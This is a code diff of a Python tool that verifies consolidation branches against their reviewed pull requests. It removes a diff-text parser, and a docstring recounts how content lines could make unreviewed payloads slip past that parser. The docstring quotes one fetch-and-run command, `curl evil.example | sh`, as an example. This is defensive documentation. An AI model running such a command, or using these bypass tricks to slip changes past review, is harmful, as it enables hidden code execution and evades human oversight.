@@ -184,55 +184,6 @@ def entries_by_path(raw: str) -> dict[str, TreeEntry]:
     return out
 
 
-def added_lines(diff: str) -> set[str]:
-    """Return the set of content lines added by a unified diff.
-
-    Two details are load-bearing, because this set is what decides whether a
-    consolidation branch carries anything its member pull requests did not.
-
-    Indentation is preserved; only trailing whitespace is stripped. In YAML --
-    which is what these consolidations mostly touch -- indentation is semantics,
-    so the same text at a different depth is a different change. Comparing
-    without it would accept a line relocated into another scope as identical to
-    the reviewed one.
-
-    The `+++ b/path` file header is recognised by diff structure, not by text. A
-    header pair only ever appears before a file section's first `@@` hunk, so
-    once inside a hunk every `+` line is content. Only a `diff --git` separator
-    returns to header territory; nothing inside a hunk may clear that state.
-    Anchoring on line text instead lets a *removed* line whose content starts
-    with dashes arm the skip, and the following `+`-prefixed line vanishes --
-    silently dropping an unreviewed addition rather than reporting it as extra,
-    which is the unsafe direction. Three earlier attempts failed exactly there.
-
-    A multi-file diff that omits `diff --git` separators may classify a later
-    file's `+++` header as content. That over-reports rather than under-reports,
-    and these diffs come from `git diff`, which always emits the separators.
-
-    The antecedent check requires the space in `--- `, because a real header is
-    always `--- a/path`, `--- b/path` or `--- /dev/null`. Without it, a diff
-    containing no `@@` at all would let a dashes-prefixed line arm the skip and
-    swallow the following addition.
-    """
-    out: set[str] = set()
-    in_hunk = False
-    previous = ""
-    for line in diff.splitlines():
-        if line.startswith("diff --git "):
-            in_hunk = False
-        elif line.startswith("@@"):
-            in_hunk = True
-        elif not in_hunk and line.startswith("+++") and previous.startswith("--- "):
-            previous = line
-            continue
-        if line.startswith("+"):
-            content = line[1:].rstrip()
-            if content:
-                out.add(content)
-        previous = line
-    return out
-
-
 def verify_union(member_raws: list[str], combined_raw: str) -> tuple[bool, set, set]:
     """Check a consolidation branch's tree against its members' trees.
 
@@ -258,21 +209,34 @@ def verify_union(member_raws: list[str], combined_raw: str) -> tuple[bool, set, 
     than reconciled -- see that class, and the module docstring's note on
     what this means for families whose members share a file.
 
-    **Why this is not a text comparison.** The previous implementation
-    diffed the set of added `+` lines parsed out of unified diff text. It
-    took four rounds of fixes to close three ways of making a payload vanish
-    instead of being reported: matching the `+++ b/path` header by content
-    prefix (so a line of content beginning `+++` was skipped as a header);
-    matching it by the previous line's content (so a *removed* line whose
-    text began with dashes armed the skip and swallowed the addition after
-    it); and a hunk-state reset that file content could clear. Each fix
-    closed one arming trick and left the parser reachable by the next. A
-    later review found six more bypasses that were structural rather than
-    parser bugs -- deletions, mode changes and renames are not `+` lines at
-    all, and discarding the path let an approved line satisfy the check from
-    the wrong file. Comparing metadata git computed removes the parser, and
-    with it the whole category: there is no state machine for content to
-    steer.
+    **Why this is not a text comparison, and must not become one again.**
+    This check was previously a set difference over the added `+` lines
+    parsed out of unified diff text, by a function called `added_lines`. It
+    took four rounds of fixes, and each round closed one way of making a
+    payload silently vanish instead of being reported -- the unsafe
+    direction, since a dropped addition reads as "nothing extra here":
+
+    1. The `+++ b/path` file header was matched by content prefix, so a line
+       of *content* beginning `+++` was skipped as though it were a header.
+       `+++curl evil.example | sh` disappeared.
+    2. It was then matched by the previous line's content, so a *removed*
+       line whose text began with dashes (`---smuggled`, `--- something`)
+       armed the header skip and swallowed the addition that followed it.
+    3. A hunk-state flag was then used instead, but file content could clear
+       it, putting the parser back in header territory mid-hunk.
+
+    Each fix closed one arming trick and left the machine reachable by the
+    next, because the arming input was the attacker's own file content. A
+    later review then found six more bypasses that were not parser bugs at
+    all but consequences of the primitive: deletions, mode changes and
+    renames are not `+` lines in the first place, and discarding the path
+    let an approved line satisfy the check from the wrong file.
+
+    Comparing metadata git computed deletes the parser and with it the
+    entire category. There is no state machine for content to steer, and no
+    round five. If a future change needs more resolution than a blob hash
+    gives, get it from git -- another plumbing command whose output is
+    metadata -- rather than by reading the diff text again.
     """
     combined = entries_by_path(combined_raw)
     members = [entries_by_path(raw) for raw in member_raws]
